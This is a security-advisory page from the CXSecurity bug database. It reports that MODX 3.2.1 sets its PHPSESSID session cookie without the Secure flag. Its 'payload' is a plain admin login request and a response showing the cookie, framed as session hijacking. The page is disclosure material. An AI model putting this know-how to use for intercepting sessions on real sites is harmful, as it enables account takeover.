---
title: MODX.3.2.1 TLS cookie without secure flag set - COOKIE PHPSESSID HIJACK
url: https://cxsecurity.com/issue/WLB-2026080003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-08-02
fetch_date: 2026-08-03T05:31:28.836640
---

# MODX.3.2.1 TLS cookie without secure flag set - COOKIE PHPSESSID HIJACK

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **MODX.3.2.1 TLS cookie without secure flag set - COOKIE PHPSESSID HIJACK** **2026.08.02**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: MODX.3.2.1 TLS cookie without secure flag set - COOKIE PHPSESSID HIJACK
# Author: nu11secur1ty
# Date: 7/7/2026
# Vendor: https://modx.com/
# Software: https://modx.com/download/subscribe?dlid=a1c54aa8-d971-4cd4-a279-340f6e806706&skip=1
# Reference: https://portswigger.net/kb/issues/00500200\_tls-cookie-without-secure-flag-set
## Description:
The following cookie was issued by the application and does not have the secure flag set:
- PHPSESSID
The cookie appears to contain a session token, which may increase the risk associated with this issue. You should review the contents of the cookie to determine its function.
- Issue background
If the secure flag is set on a cookie, then browsers will not submit the cookie in any requests that use an unencrypted HTTP connection, thereby preventing the cookie from being trivially intercepted by an attacker monitoring network traffic. If the secure flag is not set, then the cookie will be transmitted in clear-text if the user visits any HTTP URLs within the cookie's scope. An attacker may be able to induce this event by feeding a user suitable links, either directly or via another web site. Even if the domain that issued the cookie does not host any content that is accessed over HTTP, an attacker may be able to use links of the form http://example.com:443/ to perform the same attack.
To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.
STATUS: MEDIUM - HIGH
[+]Payload:
```
POST /modx-3.2.1-pl/manager/ HTTP/1.1
Host: pwnedhost.com
Cache-Control: max-age=0
Sec-CH-UA: "Chromium";v="146", "Not;A=Brand";v="24", "Google Chrome";v="146"
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: "Windows"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=8dbn1cfe2h5l4p85ntknpqqh5k
Origin: https://pwnedhost.com
Upgrade-Insecure-Requests: 1
Referer: https://pwnedhost.com/modx-3.2.1-pl/manager/
Content-Type: application/x-www-form-urlencoded
Content-Length: 120
login\_context=mgr&modhash=&returnUrl=%2Fmodx-3.2.1-pl%2Fmanager%2F&username=admin&password=password&rememberme=1&login=1
```
[+]Response:
```
HTTP/1.1 302 Found
Date: Tue, 07 Jul 2026 12:29:09 GMT
Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4
X-Powered-By: PHP/8.2.4
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=kcdesvjuvt21ha9vq2c0l25gla; expires=Tue, 14 Jul 2026 12:29:09 GMT; Max-Age=604800; path=/modx-3.2.1-pl/; HttpOnly
Location: https://pwnedhost.com/modx-3.2.1-pl/manager
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```
# Exploit video:
[href](https://www.patreon.com/nu11secur1ty/posts/modx-3-2-1-tls-163149077)
# Time spent:
01:47:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <https://www.asc3t1c-nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026080003)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top